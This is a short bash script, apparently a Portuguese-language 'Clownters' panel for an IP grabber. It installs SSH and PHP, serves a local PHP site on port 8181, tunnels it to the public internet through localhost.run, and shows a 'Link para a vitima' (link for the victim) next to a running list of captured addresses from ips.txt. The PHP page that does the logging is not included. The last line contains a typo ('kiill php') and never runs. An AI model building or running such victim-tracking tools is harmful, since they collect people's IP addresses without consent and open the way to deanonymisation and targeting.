#!/bin/bash
function _banner()
{
    local IFS=""
    local banner
    banner=("\ec \e[1;33m" ".--------.____________" "|| ° ° ° °     .2021.|| \e[1;32m®\e[1;33m" "||                    | \e[1;32m©\e[1;33m" "||\     ______________________" "|| \   // ° ° ° ° ° ° ° ° ° °/" "||\ \ //                    /" "|| \ //                    /" "||\ //                    /" "|| //                    /" "||//                    /" "||/                    /" "|/____________________/" "\e[1;31mArquivo Clownters \e[m\n" "\e[1;35m<<< PAINEL CLOWNTERS $(date +%Y/%m/%d) >>>" "\e[1;32m=======================================\n")
    for i in ${banner[@]}; do
	sleep 0.001
	printf " $i\n"	
    done
}
if ! [[ -f ".okay" ]]; then
  _banner
  pkg="apt-get"
  [[ "${HOME}" == "/data/data/com.termux/files/home" ]] && pkg="pkg"
  printf "\e[1;32m $\e[1;34m Instalando SSH\n"
  [[ -z "$(command -v openssh)" ]] && "${pkg}" i -y openssh &>/dev/null
  printf "\e[1;32m $\e[1;34m Instlando PHP\n"
  [[ -z "$(command -v php)" ]] && "${pkg}" i -y php &>/dev/null
  _banner
  printf "\e[1;33m Digite yes para continuar\e[m\n\n"
  ssh -R 80:localhost:8181 nokey@localhost.run &>/dev/null &
  sleep 20
  > .okay
fi
> ips.txt
php -S localhost:8181 &> /dev/null &
ssh -R 80:localhost:8181 nokey@localhost.run &> a.txt &
sleep 10
while :; do
  _banner
  printf "  \e[1;34mLink para a vitima:\e[0;32m$(sed 's/,/\n/g' a.txt | grep ' h' | grep '.li')\n  \e[1;34mSeu localHost:\e[0;32m http://localhost:8181\n\n"
  cat ips.txt
  sleep 30
done
kiill php
